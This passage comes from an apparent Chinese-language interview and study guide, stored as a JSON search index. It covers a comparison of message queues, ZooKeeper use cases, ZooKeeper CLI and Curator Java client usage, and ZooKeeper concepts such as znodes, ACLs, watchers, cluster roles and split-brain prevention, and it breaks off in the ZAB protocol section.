topic 数量对吞吐量的影响   topic 可以达到几百/几千的级别，吞吐量会有较小幅度的下降，这是 RocketMQ 的一大优势，在同等机器下，可以支撑大量的 topic topic 从几十到几百个时候，吞吐量会大幅度下降，在同等机器下，Kafka 尽量保证 topic 数量不要过多，如果要支撑大规模的 topic，需要增加更多的机器资源   时效性 ms 级 微秒级，这是 RabbitMQ 的一大特点，延迟最低 ms 级 延迟在 ms 级以内   可用性 高，基于主从架构实现高可用 同 ActiveMQ 非常高，分布式架构 非常高，分布式，一个数据多个副本，少数机器宕机，不会丢失数据，不会导致不可用   消息可靠性 有较低的概率丢失数据 基本不丢 经过参数优化配置，可以做到 0 丢失 同 RocketMQ   功能支持 MQ 领域的功能极其完备 基于 erlang 开发，并发能力很强，性能极好，延时很低 MQ 功能较为完善，还是分布式的，扩展性好 功能较为简单，主要支持简单的 MQ 功能，在大数据领域的实时计算以及日志采集被大规模使用    综上，各种对比之后，有如下建议：\n一般的业务系统要引入 MQ，最早大家都用 ActiveMQ，但是现在确实大家用的不多了，没经过大规模吞吐量场景的验证，社区也不是很活跃，所以大家还是算了吧，我个人不推荐用这个了；\n后来大家开始用 RabbitMQ，但是确实 erlang 语言阻止了大量的 Java 工程师去深入研究和掌控它，对公司而言，几乎处于不可控的状态，但是确实人家是开源的，比较稳定的支持，活跃度也高；\n不过现在确实越来越多的公司会去用 RocketMQ，确实很不错，毕竟是阿里出品，但社区可能有突然黄掉的风险（目前 RocketMQ 已捐给 Apache，但 GitHub 上的活跃度其实不算高）对自己公司技术实力有绝对自信的，推荐用 RocketMQ，否则回去老老实实用 RabbitMQ 吧，人家有活跃的开源社区，绝对不会黄。\n所以中小型公司，技术实力较为一般，技术挑战不是特别高，用 RabbitMQ 是不错的选择；大型公司，基础架构研发实力较强，用 RocketMQ 是很好的选择。\n如果是大数据领域的实时计算、日志采集等场景，用 Kafka 是业内标准的，绝对没问题，社区活跃度很高，绝对不会黄，何况几乎是全世界这个领域的事实性规范。\n"},{"id":316,"href":"/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/zookeeper-application-scenarios/","title":"zookeeper-application-scenarios","parent":"分布式系统","content":"面试题    zookeeper 都有哪些使用场景？\n面试官心理分析    现在聊的 topic 是分布式系统，面试官跟你聊完了 dubbo 相关的一些问题之后，已经确认你对分布式服务框架/RPC 框架基本都有一些认知了。那么他可能开始要跟你聊分布式相关的其它问题了。\n分布式锁这个东西，很常用的，你做 Java 系统开发，分布式系统，可能会有一些场景会用到。最常用的分布式锁就是基于 zookeeper 来实现的。\n其实说实话，问这个问题，一般就是看看你是否了解 zookeeper，因为 zookeeper 是分布式系统中很常见的一个基础系统。而且问的话常问的就是说 zookeeper 的使用场景是什么？看你知道不知道一些基本的使用场景。但是其实 zookeeper 挖深了自然是可以问的很深很深的。\n面试题剖析    大致来说，zookeeper 的使用场景如下，我就举几个简单的，大家能说几个就好了：\n 分布式协调 分布式锁 元数据/配置信息管理 HA 高可用性  分布式协调    这个其实是 zookeeper 很经典的一个用法，简单来说，就好比，你 A 系统发送个请求到 mq，然后 B 系统消息消费之后处理了。那 A 系统如何知道 B 系统的处理结果？用 zookeeper 就可以实现分布式系统之间的协调工作。A 系统发送请求之后可以在 zookeeper 上对某个节点的值注册个监听器，一旦 B 系统处理完了就修改 zookeeper 那个节点的值，A 系统立马就可以收到通知，完美解决。\n分布式锁    举个栗子。对某一个数据连续发出两个修改操作，两台机器同时收到了请求，但是只能一台机器先执行完另外一个机器再执行。那么此时就可以使用 zookeeper 分布式锁，一个机器接收到了请求之后先获取 zookeeper 上的一把分布式锁，就是可以去创建一个 znode，接着执行操作；然后另外一个机器也尝试去创建那个 znode，结果发现自己创建不了，因为被别人创建了，那只能等着，等第一个机器执行完了自己再执行。\n元数据/配置信息管理    zookeeper 可以用作很多系统的配置信息的管理，比如 kafka、storm 等等很多分布式系统都会选用 zookeeper 来做一些元数据、配置信息的管理，包括 dubbo 注册中心不也支持 zookeeper 么？\nHA 高可用性    这个应该是很常见的，比如 hadoop、hdfs、yarn 等很多大数据系统，都选择基于 zookeeper 来开发 HA 高可用机制，就是一个重要进程一般会做主备两个，主进程挂了立马通过 zookeeper 感知到切换到备用进程。\n"},{"id":317,"href":"/system-design/distributed-system/zookeeper/zookeeper-in-action/","title":"zookeeper-in-action","parent":"zookeeper","content":" 1. 前言 2. ZooKeeper 安装和使用  2.1. 使用Docker 安装 zookeeper 2.2. 连接 ZooKeeper 服务 2.3. 常用命令演示  2.3.1. 查看常用命令(help 命令) 2.3.2. 创建节点(create 命令) 2.3.3. 更新节点数据内容(set 命令) 2.3.4. 获取节点的数据(get 命令) 2.3.5. 查看某个目录下的子节点(ls 命令) 2.3.6. 查看节点状态(stat 命令) 2.3.7. 查看节点信息和状态(ls2 命令) 2.3.8. 删除节点(delete 命令)     3. ZooKeeper Java客户端 Curator简单使用  3.1. 连接 ZooKeeper 客户端 3.2. 数据节点的增删改查  3.2.1. 创建节点 3.2.2. 删除节点 3.2.3. 获取/更新节点数据内容 3.2.4. 获取某个节点的所有子节点路径      1. 前言    这篇文章简单给演示一下 ZooKeeper 常见命令的使用以及 ZooKeeper Java客户端 Curator 的基本使用。介绍到的内容都是最基本的操作，能满足日常工作的基本需要。\n如果文章有任何需要改善和完善的地方，欢迎在评论区指出，共同进步！\n2. ZooKeeper 安装和使用    2.1. 使用Docker 安装 zookeeper    a.使用 Docker 下载 ZooKeeper\ndocker pull zookeeper:3.5.8 b.运行 ZooKeeper\ndocker run -d --name zookeeper -p 2181:2181 zookeeper:3.5.8 2.2. 连接 ZooKeeper 服务    a.进入ZooKeeper容器中\n先使用 docker ps 查看 ZooKeeper 的 ContainerID，然后使用 docker exec -it ContainerID /bin/bash 命令进入容器中。\nb.先进入 bin 目录,然后通过 ./zkCli.sh -server 127.0.0.1:2181命令连接ZooKeeper 服务\nroot@eaf70fc620cb:/apache-zookeeper-3.5.8-bin# cd bin 如果你看到控制台成功打印出如下信息的话，说明你已经成功连接 ZooKeeper 服务。\n2.3. 常用命令演示    2.3.1. 查看常用命令(help 命令)    通过 help 命令查看 ZooKeeper 常用命令\n2.3.2. 创建节点(create 命令)    通过 create 命令在根目录创建了 node1 节点，与它关联的字符串是\u0026quot;node1\u0026quot;\n[zk: 127.0.0.1:2181(CONNECTED) 34] create /node1 “node1” 通过 create 命令在根目录创建了 node1 节点，与它关联的内容是数字 123\n[zk: 127.0.0.1:2181(CONNECTED) 1] create /node1/node1.1 123 Created /node1/node1.1 2.3.3. 更新节点数据内容(set 命令)    [zk: 127.0.0.1:2181(CONNECTED) 11] set /node1 \u0026#34;set node1\u0026#34; 2.3.4. 获取节点的数据(get 命令)    get 命令可以获取指定节点的数据内容和节点的状态,可以看出我们通过 set 命令已经将节点数据内容改为 \u0026ldquo;set node1\u0026rdquo;。\nset node1 cZxid = 0x47 ctime = Sun Jan 20 10:22:59 CST 2019 mZxid = 0x4b mtime = Sun Jan 20 10:41:10 CST 2019 pZxid = 0x4a cversion = 1 dataVersion = 1 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 9 numChildren = 1 2.3.5. 查看某个目录下的子节点(ls 命令)    通过 ls 命令查看根目录下的节点\n[zk: 127.0.0.1:2181(CONNECTED) 37] ls / [dubbo, ZooKeeper, node1] 通过 ls 命令查看 node1 目录下的节点\n[zk: 127.0.0.1:2181(CONNECTED) 5] ls /node1 [node1.1] ZooKeeper 中的 ls 命令和 linux 命令中的 ls 类似， 这个命令将列出绝对路径 path 下的所有子节点信息（列出 1 级，并不递归）\n2.3.6. 查看节点状态(stat 命令)    通过 stat 命令查看节点状态\n[zk: 127.0.0.1:2181(CONNECTED) 10] stat /node1 cZxid = 0x47 ctime = Sun Jan 20 10:22:59 CST 2019 mZxid = 0x47 mtime = Sun Jan 20 10:22:59 CST 2019 pZxid = 0x4a cversion = 1 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 11 numChildren = 1 上面显示的一些信息比如 cversion、aclVersion、numChildren 等等，我在上面 “znode(数据节点)的结构” 这部分已经介绍到。\n2.3.7. 查看节点信息和状态(ls2 命令)    ls2 命令更像是 ls 命令和 stat 命令的结合。 ls2 命令返回的信息包括 2 部分：\n 子节点列表 当前节点的 stat 信息。  [zk: 127.0.0.1:2181(CONNECTED) 7] ls2 /node1 [node1.1] cZxid = 0x47 ctime = Sun Jan 20 10:22:59 CST 2019 mZxid = 0x47 mtime = Sun Jan 20 10:22:59 CST 2019 pZxid = 0x4a cversion = 1 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 11 numChildren = 1 2.3.8. 删除节点(delete 命令)    这个命令很简单，但是需要注意的一点是如果你要删除某一个节点，那么这个节点必须无子节点才行。\n[zk: 127.0.0.1:2181(CONNECTED) 3] delete /node1/node1.1 在后面我会介绍到 Java 客户端 API 的使用以及开源 ZooKeeper 客户端 ZkClient 和 Curator 的使用。\n3. ZooKeeper Java客户端 Curator简单使用    Curator 是Netflix公司开源的一套 ZooKeeper Java客户端框架，相比于 Zookeeper 自带的客户端 zookeeper 来说，Curator 的封装更加完善，各种 API 都可以比较方便地使用。\n下面我们就来简单地演示一下 Curator 的使用吧！\nCurator4.0+版本对ZooKeeper 3.5.x支持比较好。开始之前，请先将下面的依赖添加进你的项目。\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.curator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;curator-framework\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.curator\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;curator-recipes\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.2.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 3.1. 连接 ZooKeeper 客户端    通过 CuratorFrameworkFactory 创建 CuratorFramework 对象，然后再调用 CuratorFramework 对象的 start() 方法即可！\nprivate static final int BASE_SLEEP_TIME = 1000; private static final int MAX_RETRIES = 3; // Retry strategy. Retry 3 times, and will increase the sleep time between retries. RetryPolicy retryPolicy = new ExponentialBackoffRetry(BASE_SLEEP_TIME, MAX_RETRIES); CuratorFramework zkClient = CuratorFrameworkFactory.builder() // the server to connect to (can be a server list)  .connectString(\u0026#34;127.0.0.1:2181\u0026#34;) .retryPolicy(retryPolicy) .build(); zkClient.start(); 对于一些基本参数的说明：\n baseSleepTimeMs：重试之间等待的初始时间 maxRetries ：最大重试次数 connectString ：要连接的服务器列表 retryPolicy ：重试策略  3.2. 数据节点的增删改查    3.2.1. 创建节点    我们在 ZooKeeper常见概念解读 中介绍到，我们通常是将 znode 分为 4 大类：\n 持久（PERSISTENT）节点 ：一旦创建就一直存在即使 ZooKeeper 集群宕机，直到将其删除。 临时（EPHEMERAL）节点 ：临时节点的生命周期是与 客户端会话（session） 绑定的，会话消失则节点消失 。并且，临时节点 只能做叶子节点 ，不能创建子节点。 持久顺序（PERSISTENT_SEQUENTIAL）节点 ：除了具有持久（PERSISTENT）节点的特性之外， 子节点的名称还具有顺序性。比如 /node1/app0000000001 、/node1/app0000000002 。 临时顺序（EPHEMERAL_SEQUENTIAL）节点 ：除了具备临时（EPHEMERAL）节点的特性之外，子节点的名称还具有顺序性。  你在使用的ZooKeeper 的时候，会发现 CreateMode 类中实际有 7种 znode 类型 ，但是用的最多的还是上面介绍的 4 种。\na.创建持久化节点\n你可以通过下面两种方式创建持久化的节点。\n//注意:下面的代码会报错，下文说了具体原因 zkClient.create().forPath(\u0026#34;/node1/00001\u0026#34;); zkClient.create().withMode(CreateMode.PERSISTENT).forPath(\u0026#34;/node1/00002\u0026#34;); 但是，你运行上面的代码会报错，这是因为的父节点node1还未创建。\n你可以先创建父节点 node1 ，然后再执行上面的代码就不会报错了。\nzkClient.create().forPath(\u0026#34;/node1\u0026#34;); 更推荐的方式是通过下面这行代码， creatingParentsIfNeeded() 可以保证父节点不存在的时候自动创建父节点，这是非常有用的。\nzkClient.create().creatingParentsIfNeeded().withMode(CreateMode.PERSISTENT).forPath(\u0026#34;/node1/00001\u0026#34;); b.创建临时节点\nzkClient.create().creatingParentsIfNeeded().withMode(CreateMode.EPHEMERAL).forPath(\u0026#34;/node1/00001\u0026#34;); c.创建节点并指定数据内容\nzkClient.create().creatingParentsIfNeeded().withMode(CreateMode.EPHEMERAL).forPath(\u0026#34;/node1/00001\u0026#34;,\u0026#34;java\u0026#34;.getBytes()); zkClient.getData().forPath(\u0026#34;/node1/00001\u0026#34;);//获取节点的数据内容，获取到的是 byte数组 d.检测节点是否创建成功\nzkClient.checkExists().forPath(\u0026#34;/node1/00001\u0026#34;);//不为null的话，说明节点创建成功 3.2.2. 删除节点    a.删除一个子节点\nzkClient.delete().forPath(\u0026#34;/node1/00001\u0026#34;); b.删除一个节点以及其下的所有子节点\nzkClient.delete().deletingChildrenIfNeeded().forPath(\u0026#34;/node1\u0026#34;); 3.2.3. 获取/更新节点数据内容    zkClient.create().creatingParentsIfNeeded().withMode(CreateMode.EPHEMERAL).forPath(\u0026#34;/node1/00001\u0026#34;,\u0026#34;java\u0026#34;.getBytes()); zkClient.getData().forPath(\u0026#34;/node1/00001\u0026#34;);//获取节点的数据内容 zkClient.setData().forPath(\u0026#34;/node1/00001\u0026#34;,\u0026#34;c++\u0026#34;.getBytes());//更新节点数据内容 3.2.4. 获取某个节点的所有子节点路径    List\u0026lt;String\u0026gt; childrenPaths = zkClient.getChildren().forPath(\u0026#34;/node1\u0026#34;); "},{"id":318,"href":"/system-design/distributed-system/zookeeper/zookeeper-intro/","title":"zookeeper-intro","parent":"zookeeper","content":" 1. 前言 2. ZooKeeper 介绍  2.1. ZooKeeper 由来 2.2. ZooKeeper 概览 2.3. ZooKeeper 特点 2.4. ZooKeeper 典型应用场景 2.5. 有哪些著名的开源项目用到了 ZooKeeper?   3. ZooKeeper 重要概念解读  3.1. Data model（数据模型） 3.2. znode（数据节点）  3.2.1. znode 4 种类型 3.2.2. znode 数据结构   3.3. 版本（version） 3.4. ACL（权限控制） 3.5. Watcher（事件监听器） 3.6. 会话（Session）   4. ZooKeeper 集群  4.1. ZooKeeper 集群角色 4.2. ZooKeeper 集群中的服务器状态 4.3. ZooKeeper 集群为啥最好奇数台？   5. ZAB 协议和 Paxos 算法  5.1. ZAB 协议介绍 5.2. ZAB 协议两种基本的模式：崩溃恢复和消息广播   6. 总结 7. 参考  1. 前言    相信大家对 ZooKeeper 应该不算陌生。但是你真的了解 ZooKeeper 到底有啥用不？如果别人/面试官让你给他讲讲对于 ZooKeeper 的认识，你能回答到什么地步呢？\n拿我自己来说吧！我本人曾经使用 Dubbo 来做分布式项目的时候，使用了 ZooKeeper 作为注册中心。为了保证分布式系统能够同步访问某个资源，我还使用 ZooKeeper 做过分布式锁。另外，我在学习 Kafka 的时候，知道 Kafka 很多功能的实现依赖了 ZooKeeper。\n前几天，总结项目经验的时候，我突然问自己 ZooKeeper 到底是个什么东西？想了半天，脑海中只是简单的能浮现出几句话：\n ZooKeeper 可以被用作注册中心、分布式锁； ZooKeeper 是 Hadoop 生态系统的一员； 构建 ZooKeeper 集群的时候，使用的服务器最好是奇数台。  由此可见，我对于 ZooKeeper 的理解仅仅是停留在了表面。\n所以，通过本文，希望带大家稍微详细的了解一下 ZooKeeper 。如果没有学过 ZooKeeper ，那么本文将会是你进入 ZooKeeper 大门的垫脚砖。如果你已经接触过 ZooKeeper ，那么本文将带你回顾一下 ZooKeeper 的一些基础概念。\n另外，本文不光会涉及到 ZooKeeper 的一些概念，后面的文章会介绍到 ZooKeeper 常见命令的使用以及使用 Apache Curator 作为 ZooKeeper 的客户端。\n如果文章有任何需要改善和完善的地方，欢迎在评论区指出，共同进步！\n2. ZooKeeper 介绍    2.1. ZooKeeper 由来    正式介绍 ZooKeeper 之前，我们先来看看 ZooKeeper 的由来，还挺有意思的。\n下面这段内容摘自《从 Paxos 到 ZooKeeper 》第四章第一节，推荐大家阅读一下：\n ZooKeeper 最早起源于雅虎研究院的一个研究小组。在当时，研究人员发现，在雅虎内部很多大型系统基本都需要依赖一个类似的系统来进行分布式协调，但是这些系统往往都存在分布式单点问题。所以，雅虎的开发人员就试图开发一个通用的无单点问题的分布式协调框架，以便让开发人员将精力集中在处理业务逻辑上。\n关于“ZooKeeper”这个项目的名字，其实也有一段趣闻。在立项初期，考虑到之前内部很多项目都是使用动物的名字来命名的（例如著名的 Pig 项目),雅虎的工程师希望给这个项目也取一个动物的名字。时任研究院的首席科学家 RaghuRamakrishnan 开玩笑地说：“在这样下去，我们这儿就变成动物园了！”此话一出，大家纷纷表示就叫动物园管理员吧一一一因为各个以动物命名的分布式组件放在一起，雅虎的整个分布式系统看上去就像一个大型的动物园了，而 ZooKeeper 正好要用来进行分布式环境的协调一一于是，ZooKeeper 的名字也就由此诞生了。\n 2.2. ZooKeeper 概览    ZooKeeper 是一个开源的分布式协调服务，它的设计目标是将那些复杂且容易出错的分布式一致性服务封装起来，构成一个高效可靠的原语集，并以一系列简单易用的接口提供给用户使用。\n 原语： 操作系统或计算机网络用语范畴。是由若干条指令组成的，用于完成一定功能的一个过程。具有不可分割性·即原语的执行必须是连续的，在执行过程中不允许被中断。\n ZooKeeper 为我们提供了高可用、高性能、稳定的分布式数据一致性解决方案，通常被用于实现诸如数据发布/订阅、负载均衡、命名服务、分布式协调/通知、集群管理、Master 选举、分布式锁和分布式队列等功能。\n另外，ZooKeeper 将数据保存在内存中，性能是非常棒的。 在“读”多于“写”的应用程序中尤其地高性能，因为“写”会导致所有的服务器间同步状态。（“读”多于“写”是协调服务的典型场景）。\n2.3. ZooKeeper 特点     顺序一致性： 从同一客户端发起的事务请求，最终将会严格地按照顺序被应用到 ZooKeeper 中去。 原子性： 所有事务请求的处理结果在整个集群中所有机器上的应用情况是一致的，也就是说，要么整个集群中所有的机器都成功应用了某一个事务，要么都没有应用。 单一系统映像 ： 无论客户端连到哪一个 ZooKeeper 服务器上，其看到的服务端数据模型都是一致的。 可靠性： 一旦一次更改请求被应用，更改的结果就会被持久化，直到被下一次更改覆盖。  2.4. ZooKeeper 典型应用场景    ZooKeeper 概览中，我们介绍到使用其通常被用于实现诸如数据发布/订阅、负载均衡、命名服务、分布式协调/通知、集群管理、Master 选举、分布式锁和分布式队列等功能。\n下面选 3 个典型的应用场景来专门说说：\n 分布式锁 ： 通过创建唯一节点获得分布式锁，当获得锁的一方执行完相关代码或者是挂掉之后就释放锁。 命名服务 ：可以通过 ZooKeeper 的顺序节点生成全局唯一 ID 数据发布/订阅 ：通过 Watcher 机制 可以很方便地实现数据发布/订阅。当你将数据发布到 ZooKeeper 被监听的节点上，其他机器可通过监听 ZooKeeper 上节点的变化来实现配置的动态更新。  实际上，这些功能的实现基本都得益于 ZooKeeper 可以保存数据的功能，但是 ZooKeeper 不适合保存大量数据，这一点需要注意。\n2.5. 有哪些著名的开源项目用到了 ZooKeeper?     Kafka : ZooKeeper 主要为 Kafka 提供 Broker 和 Topic 的注册以及多个 Partition 的负载均衡等功能。 Hbase : ZooKeeper 为 Hbase 提供确保整个集群只有一个 Master 以及保存和提供 regionserver 状态信息（是否在线）等功能。 Hadoop : ZooKeeper 为 Namenode 提供高可用支持。  3. ZooKeeper 重要概念解读    破音：拿出小本本，下面的内容非常重要哦！\n3.1. Data model（数据模型）    ZooKeeper 数据模型采用层次化的多叉树形结构，每个节点上都可以存储数据，这些数据可以是数字、字符串或者是二级制序列。并且。每个节点还可以拥有 N 个子节点，最上层是根节点以“/”来代表。每个数据节点在 ZooKeeper 中被称为 znode，它是 ZooKeeper 中数据的最小单元。并且，每个 znode 都一个唯一的路径标识。\n强调一句：ZooKeeper 主要是用来协调服务的，而不是用来存储业务数据的，所以不要放比较大的数据在 znode 上，ZooKeeper 给出的上限是每个结点的数据大小最大是 1M。\n从下图可以更直观地看出：ZooKeeper 节点路径标识方式和 Unix 文件系统路径非常相似，都是由一系列使用斜杠\u0026quot;/\u0026ldquo;进行分割的路径表示，开发人员可以向这个节点中写入数据，也可以在节点下面创建子节点。这些操作我们后面都会介绍到。\n3.2. znode（数据节点）    介绍了 ZooKeeper 树形数据模型之后，我们知道每个数据节点在 ZooKeeper 中被称为 znode，它是 ZooKeeper 中数据的最小单元。你要存放的数据就放在上面，是你使用 ZooKeeper 过程中经常需要接触到的一个概念。\n3.2.1. znode 4 种类型    我们通常是将 znode 分为 4 大类：\n 持久（PERSISTENT）节点 ：一旦创建就一直存在即使 ZooKeeper 集群宕机，直到将其删除。 临时（EPHEMERAL）节点 ：临时节点的生命周期是与 客户端会话（session） 绑定的，会话消失则节点消失 。并且，临时节点只能做叶子节点 ，不能创建子节点。 持久顺序（PERSISTENT_SEQUENTIAL）节点 ：除了具有持久（PERSISTENT）节点的特性之外， 子节点的名称还具有顺序性。比如 /node1/app0000000001 、/node1/app0000000002 。 临时顺序（EPHEMERAL_SEQUENTIAL）节点 ：除了具备临时（EPHEMERAL）节点的特性之外，子节点的名称还具有顺序性。  3.2.2. znode 数据结构    每个 znode 由 2 部分组成:\n stat ：状态信息 data ： 节点存放的数据的具体内容  如下所示，我通过 get 命令来获取 根目录下的 dubbo 节点的内容。（get 命令在下面会介绍到）。\n[zk: 127.0.0.1:2181(CONNECTED) 6] get /dubbo # 该数据节点关联的数据内容为空 null # 下面是该数据节点的一些状态信息，其实就是 Stat 对象的格式化输出 cZxid = 0x2 ctime = Tue Nov 27 11:05:34 CST 2018 mZxid = 0x2 mtime = Tue Nov 27 11:05:34 CST 2018 pZxid = 0x3 cversion = 1 dataVersion = 0 aclVersion = 0 ephemeralOwner = 0x0 dataLength = 0 numChildren = 1 Stat 类中包含了一个数据节点的所有状态信息的字段，包括事务 ID-cZxid、节点创建时间-ctime 和子节点个数-numChildren 等等。\n下面我们来看一下每个 znode 状态信息究竟代表的是什么吧！（下面的内容来源于《从 Paxos 到 ZooKeeper 分布式一致性原理与实践》，因为 Guide 确实也不是特别清楚，要学会参考资料的嘛！ ） ：\n   znode 状态信息 解释     cZxid create ZXID，即该数据节点被创建时的事务 id   ctime create time，即该节点的创建时间   mZxid modified ZXID，即该节点最终一次更新时的事务 id   mtime modified time，即该节点最后一次的更新时间   pZxid 该节点的子节点列表最后一次修改时的事务 id，只有子节点列表变更才会更新 pZxid，子节点内容变更不会更新   cversion 子节点版本号，当前节点的子节点每次变化时值增加 1   dataVersion 数据节点内容版本号，节点创建时为 0，每更新一次节点内容(不管内容有无变化)该版本号的值增加 1   aclVersion 节点的 ACL 版本号，表示该节点 ACL 信息变更次数   ephemeralOwner 创建该临时节点的会话的 sessionId；如果当前节点为持久节点，则 ephemeralOwner=0   dataLength 数据节点内容长度   numChildren 当前节点的子节点个数    3.3. 版本（version）    在前面我们已经提到，对应于每个 znode，ZooKeeper 都会为其维护一个叫作 Stat 的数据结构，Stat 中记录了这个 znode 的三个相关的版本：\n dataVersion ：当前 znode 节点的版本号 cversion ： 当前 znode 子节点的版本 aclVersion ： 当前 znode 的 ACL 的版本。  3.4. ACL（权限控制）    ZooKeeper 采用 ACL（AccessControlLists）策略来进行权限控制，类似于 UNIX 文件系统的权限控制。\n对于 znode 操作的权限，ZooKeeper 提供了以下 5 种：\n CREATE : 能创建子节点 READ ：能获取节点数据和列出其子节点 WRITE : 能设置/更新节点数据 DELETE : 能删除子节点 ADMIN : 能设置节点 ACL 的权限  其中尤其需要注意的是，CREATE 和 DELETE 这两种权限都是针对 子节点 的权限控制。\n对于身份认证，提供了以下几种方式：\n world ： 默认方式，所有用户都可无条件访问。 auth :不使用任何 id，代表任何已认证的用户。 digest :用户名:密码认证方式： username:password 。 ip : 对指定 ip 进行限制。  3.5. Watcher（事件监听器）    Watcher（事件监听器），是 ZooKeeper 中的一个很重要的特性。ZooKeeper 允许用户在指定节点上注册一些 Watcher，并且在一些特定事件触发的时候，ZooKeeper 服务端会将事件通知到感兴趣的客户端上去，该机制是 ZooKeeper 实现分布式协调服务的重要特性。\n破音：非常有用的一个特性，都能出小本本记好了，后面用到 ZooKeeper 基本离不开 Watcher（事件监听器）机制。\n3.6. 会话（Session）    Session 可以看作是 ZooKeeper 服务器与客户端的之间的一个 TCP 长连接，通过这个连接，客户端能够通过心跳检测与服务器保持有效的会话，也能够向 ZooKeeper 服务器发送请求并接受响应，同时还能够通过该连接接收来自服务器的 Watcher 事件通知。\nSession 有一个属性叫做：sessionTimeout ，sessionTimeout 代表会话的超时时间。当由于服务器压力太大、网络故障或是客户端主动断开连接等各种原因导致客户端连接断开时，只要在sessionTimeout规定的时间内能够重新连接上集群中任意一台服务器，那么之前创建的会话仍然有效。\n另外，在为客户端创建会话之前，服务端首先会为每个客户端都分配一个 sessionID。由于 sessionID是 ZooKeeper 会话的一个重要标识，许多与会话相关的运行机制都是基于这个 sessionID 的，因此，无论是哪台服务器为客户端分配的 sessionID，都务必保证全局唯一。\n4. ZooKeeper 集群    为了保证高可用，最好是以集群形态来部署 ZooKeeper，这样只要集群中大部分机器是可用的（能够容忍一定的机器故障），那么 ZooKeeper 本身仍然是可用的。通常 3 台服务器就可以构成一个 ZooKeeper 集群了。ZooKeeper 官方提供的架构图就是一个 ZooKeeper 集群整体对外提供服务。\n上图中每一个 Server 代表一个安装 ZooKeeper 服务的服务器。组成 ZooKeeper 服务的服务器都会在内存中维护当前的服务器状态，并且每台服务器之间都互相保持着通信。集群间通过 ZAB 协议（ZooKeeper Atomic Broadcast）来保持数据的一致性。\n最典型集群模式： Master/Slave 模式（主备模式）。在这种模式中，通常 Master 服务器作为主服务器提供写服务，其他的 Slave 服务器从服务器通过异步复制的方式获取 Master 服务器最新的数据提供读服务。\n4.1. ZooKeeper 集群角色    但是，在 ZooKeeper 中没有选择传统的 Master/Slave 概念，而是引入了 Leader、Follower 和 Observer 三种角色。如下图所示\nZooKeeper 集群中的所有机器通过一个 Leader 选举过程 来选定一台称为 “Leader” 的机器，Leader 既可以为客户端提供写服务又能提供读服务。除了 Leader 外，Follower 和 Observer 都只能提供读服务。Follower 和 Observer 唯一的区别在于 Observer 机器不参与 Leader 的选举过程，也不参与写操作的“过半写成功”策略，因此 Observer 机器可以在不影响写性能的情况下提升集群的读性能。\n   角色 说明     Leader 为客户端提供读和写的服务，负责投票的发起和决议，更新系统状态。   Follower 为客户端提供读服务，如果是写服务则转发给 Leader。参与选举过程中的投票。   Observer 为客户端提供读服务，如果是写服务则转发给 Leader。不参与选举过程中的投票，也不参与“过半写成功”策略。在不影响写性能的情况下提升集群的读性能。此角色于 ZooKeeper3.3 系列新增的角色。    当 Leader 服务器出现网络中断、崩溃退出与重启等异常情况时，就会进入 Leader 选举过程，这个过程会选举产生新的 Leader 服务器。\n这个过程大致是这样的：\n Leader election（选举阶段）：节点在一开始都处于选举阶段，只要有一个节点得到超半数节点的票数，它就可以当选准 leader。 Discovery（发现阶段） ：在这个阶段，followers 跟准 leader 进行通信，同步 followers 最近接收的事务提议。 Synchronization（同步阶段） :同步阶段主要是利用 leader 前一阶段获得的最新提议历史，同步集群中所有的副本。同步完成之后 准 leader 才会成为真正的 leader。 Broadcast（广播阶段） :到了这个阶段，ZooKeeper 集群才能正式对外提供事务服务，并且 leader 可以进行消息广播。同时如果有新的节点加入，还需要对新节点进行同步。  4.2. ZooKeeper 集群中的服务器状态     LOOKING ：寻找 Leader。 LEADING ：Leader 状态，对应的节点为 Leader。 FOLLOWING ：Follower 状态，对应的节点为 Follower。 OBSERVING ：Observer 状态，对应节点为 Observer，该节点不参与 Leader 选举。  4.3. ZooKeeper 集群为啥最好奇数台？    ZooKeeper 集群在宕掉几个 ZooKeeper 服务器之后，如果剩下的 ZooKeeper 服务器个数大于宕掉的个数的话整个 ZooKeeper 才依然可用。假如我们的集群中有 n 台 ZooKeeper 服务器，那么也就是剩下的服务数必须大于 n/2。先说一下结论，2n 和 2n-1 的容忍度是一样的，都是 n-1，大家可以先自己仔细想一想，这应该是一个很简单的数学问题了。\n比如假如我们有 3 台，那么最大允许宕掉 1 台 ZooKeeper 服务器，如果我们有 4 台的的时候也同样只允许宕掉 1 台。 假如我们有 5 台，那么最大允许宕掉 2 台 ZooKeeper 服务器，如果我们有 6 台的的时候也同样只允许宕掉 2 台。\n综上，何必增加那一个不必要的 ZooKeeper 呢？\n4.4. ZooKeeper 选举的过半机制防止脑裂    何为集群脑裂？\n对于一个集群，通常多台机器会部署在不同机房，来提高这个集群的可用性。保证可用性的同时，会发生一种机房间网络线路故障，导致机房间网络不通，而集群被割裂成几个小集群。这时候子集群各自选主导致“脑裂”的情况。\n举例说明：比如现在有一个由 6 台服务器所组成的一个集群，部署在了 2 个机房，每个机房 3 台。正常情况下只有 1 个 leader，但是当两个机房中间网络断开的时候，每个机房的 3 台服务器都会认为另一个机房的 3 台服务器下线，而选出自己的 leader 并对外提供服务。若没有过半机制，当网络恢复的时候会发现有 2 个 leader。仿佛是 1 个大脑（leader）分散成了 2 个大脑，这就发生了脑裂现象。脑裂期间 2 个大脑都可能对外提供了服务，这将会带来数据一致性等问题。\n过半机制是如何防止脑裂现象产生的？\nZooKeeper 的过半机制导致不可能产生 2 个 leader，因为少于等于一半是不可能产生 leader 的，这就使得不论机房的机器如何分配都不可能发生脑裂。\n5. ZAB 协议和 Paxos 算法    Paxos 算法应该可以说是 ZooKeeper 的灵魂了。但是，ZooKeeper 并没有完全采用 Paxos 算法 ，而是使用 ZAB 协议作为其保证数据一致性的核心算法。另外，在 ZooKeeper 的官方文档中也指出，ZAB 协议并不像 Paxos 算法那样，是一种通用的分布式一致性算法，它是一种特别为 Zookeeper 